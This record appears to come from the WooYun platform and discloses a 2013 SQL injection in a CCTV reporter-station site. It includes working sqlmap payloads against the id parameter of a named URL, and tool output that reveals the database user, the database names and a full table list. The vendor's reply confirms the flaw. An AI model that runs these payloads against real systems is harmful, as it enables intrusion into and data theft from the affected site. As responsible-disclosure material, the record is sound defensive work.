{"id": 6259, "wybug_id": "wooyun-2013-046259", "wybug_title": "中国网络电视台2#某站点存在SQL注射漏洞导致信息泄漏", "wybug_corp": "中国网络电视台", "wybug_author": "Mr.leo", "wybug_date": "2013-12-19 16:54", "wybug_open_date": "2014-02-02 16:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-02：\t细节向公众公开  简要描述： 中国网络电视台2#某站点存在SQL注射漏洞导致信息泄漏 详细说明：  http://zhandian.cctv.com  中央电视台国内记者站多个参数没有过滤，导致注射\n\n以id为例zhandian.cctv.com/webs.php?id=20Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=20 AND 8017=8017    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: id=20 AND (SELECT 7573 FROM(SELECT COUNT(*),CONCAT(0x3a67666e3a,(SELECT (CASE WHEN (7573=7573) THEN 1 ELSE 0 END)),0x3a62766e3a,FLOOR(RAND(0)*2))xFROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=20 AND SLEEP(5)---[18:18:54] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL 5.0[18:18:54] [INFO] fetching current user[18:18:54] [INFO] resumed: zhandian_cctv@%current user:    'zhandian_cctv@%'[18:18:54] [INFO] fetching current database[18:18:54] [INFO] resumed: news_centercurrent database:    'news_center'[18:18:54] [INFO] fetching database names[18:18:54] [INFO] the SQL query used returns 3 entries[18:18:54] [INFO] resumed: information_schema[18:18:54] [INFO] resumed: news_center[18:18:54] [INFO] resumed: news_center_ucavailable databases [3]:[*] information_schema[*] news_center[*] news_center_ucDatabase: news_center[113 tables]+--------------------------+| `[Table]ads`             || `[Table]announcements`   || `[Table]article`         || `[Table]attachments`     || `[Table]attachmenttypes` || `[Table]beijinggroups`   || `[Table]beijingmembers`  || `[Table]binglibuju`      || `[Table]blocks`          || `[Table]cache_0`         || `[Table]cache_1`         || `[Table]cache_3`         || `[Table]cache_4`         || `[Table]cache_6`         || `[Table]cache_7`         || `[Table]cache_8`         || `[Table]cache_9`         || `[Table]cache_b`         || `[Table]cache_c`         || `[Table]cache_e`         || `[Table]cache`           || `[Table]categories`      || `[Table]channels`        || `[Table]companys`        || `[Table]corpus`          || `[Table]crons`           || `[Table]customfields`    || `[Table]effects`         || `[Table]favorites`       || `[Table]flashad`         || `[Table]friendlinks`     || `[Table]friends`         || `[Table]goodsprice`      || `[Table]groupfields`     || `[Table]groupinvite`     || `[Table]groupitems`      || `[Table]groups`          || `[Table]groupuid`        || `[Table]guestbooks`      || `[Table]hrcategories`    || `[Table]hrcomments`      || `[Table]hrfolders`       || `[Table]hritems`         || `[Table]hrmessage`       || `[Table]hrrates`         || `[Table]itemtypes`       || `[Table]liuyan`          || `[Table]logininfo`       || `[Table]lovecategories`  || `[Table]lovecomments`    || `[Table]lovefolders`     || `[Table]loveitems`       || `[Table]lovemessage`     || `[Table]loverates`       || `[Table]members`         || `[Table]modelcolumns`    || `[Table]modelinterval`   || `[Table]modelperm`       || `[Table]models`          || `[Table]moviecategories` || `[Table]moviecomments`   || `[Table]moviefolders`    || `[Table]movieitems`      || `[Table]moviemessage`    || `[Table]movierates`      || `[Table]partycategories` || `[Table]partycomments`   || `[Table]partyfolders`    || `[Table]partyitems`      || `[Table]partymessage`    || `[Table]partyrates`      || `[Table]playstat`        || `[Table]polls`           || `[Table]prefields`       || `[Table]receivemessage`  || `[Table]reports`         || `[Table]robotitems`      || `[Table]robotlog`        || `[Table]robotmessages`   || `[Table]robots`          || `[Table]rss`             || `[Table]sendmessage`     || `[Table]sessions`        || `[Table]settings`        || `[Table]sitemaplogs`     || `[Table]spaceblogs`      || `[Table]spacecache`      || `[Table]spacecomments`   || `[Table]spacefiles`      || `[Table]spacegoods`      || `[Table]spaceimages`     || `[Table]spaceitems`      || `[Table]spacelinks`      || `[Table]spacenews`       || `[Table]spacetags`       || `[Table]spacevideos`     || `[Table]styles`          || `[Table]tagcache`        || `[Table]tags`            || `[Table]topicelements`   || `[Table]topics`          || `[Table]tracks`          || `[Table]usercss`         || `[Table]userfields`      || `[Table]usergroups`      || `[Table]userlinks`       || `[Table]userprofile`     || `[Table]userspacefields` || `[Table]userspaces`      || `[Table]videos`          || `[Table]visitors`        || `[Table]words`           || `[Table]ziliaoku`        |+--------------------------+   漏洞证明：  Database: news_center[113 tables]+--------------------------+| `[Table]ads`             || `[Table]announcements`   || `[Table]article`         || `[Table]attachments`     || `[Table]attachmenttypes` || `[Table]beijinggroups`   || `[Table]beijingmembers`  || `[Table]binglibuju`      || `[Table]blocks`          || `[Table]cache_0`         || `[Table]cache_1`         || `[Table]cache_3`         || `[Table]cache_4`         || `[Table]cache_6`         || `[Table]cache_7`         || `[Table]cache_8`         || `[Table]cache_9`         || `[Table]cache_b`         || `[Table]cache_c`         || `[Table]cache_e`         || `[Table]cache`           || `[Table]categories`      || `[Table]channels`        || `[Table]companys`        || `[Table]corpus`          || `[Table]crons`           || `[Table]customfields`    || `[Table]effects`         || `[Table]favorites`       || `[Table]flashad`         || `[Table]friendlinks`     || `[Table]friends`         || `[Table]goodsprice`      || `[Table]groupfields`     || `[Table]groupinvite`     || `[Table]groupitems`      || `[Table]groups`          || `[Table]groupuid`        || `[Table]guestbooks`      || `[Table]hrcategories`    || `[Table]hrcomments`      || `[Table]hrfolders`       || `[Table]hritems`         || `[Table]hrmessage`       || `[Table]hrrates`         || `[Table]itemtypes`       || `[Table]liuyan`          || `[Table]logininfo`       || `[Table]lovecategories`  || `[Table]lovecomments`    || `[Table]lovefolders`     || `[Table]loveitems`       || `[Table]lovemessage`     || `[Table]loverates`       || `[Table]members`         || `[Table]modelcolumns`    || `[Table]modelinterval`   || `[Table]modelperm`       || `[Table]models`          || `[Table]moviecategories` || `[Table]moviecomments`   || `[Table]moviefolders`    || `[Table]movieitems`      || `[Table]moviemessage`    || `[Table]movierates`      || `[Table]partycategories` || `[Table]partycomments`   || `[Table]partyfolders`    || `[Table]partyitems`      || `[Table]partymessage`    || `[Table]partyrates`      || `[Table]playstat`        || `[Table]polls`           || `[Table]prefields`       || `[Table]receivemessage`  || `[Table]reports`         || `[Table]robotitems`      || `[Table]robotlog`        || `[Table]robotmessages`   || `[Table]robots`          || `[Table]rss`             || `[Table]sendmessage`     || `[Table]sessions`        || `[Table]settings`        || `[Table]sitemaplogs`     || `[Table]spaceblogs`      || `[Table]spacecache`      || `[Table]spacecomments`   || `[Table]spacefiles`      || `[Table]spacegoods`      || `[Table]spaceimages`     || `[Table]spaceitems`      || `[Table]spacelinks`      || `[Table]spacenews`       || `[Table]spacetags`       || `[Table]spacevideos`     || `[Table]styles`          || `[Table]tagcache`        || `[Table]tags`            || `[Table]topicelements`   || `[Table]topics`          || `[Table]tracks`          || `[Table]usercss`         || `[Table]userfields`      || `[Table]usergroups`      || `[Table]userlinks`       || `[Table]userprofile`     || `[Table]userspacefields` || `[Table]userspaces`      || `[Table]videos`          || `[Table]visitors`        || `[Table]words`           || `[Table]ziliaoku`        |+--------------------------+   修复方案：  过滤参数   版权声明：转载请注明来源 Mr.leo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-12-20 15:57 厂商回复： 非常感谢，我们将尽快进行该业务的整改！～～感谢您对我们的支持和帮助！～～～ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}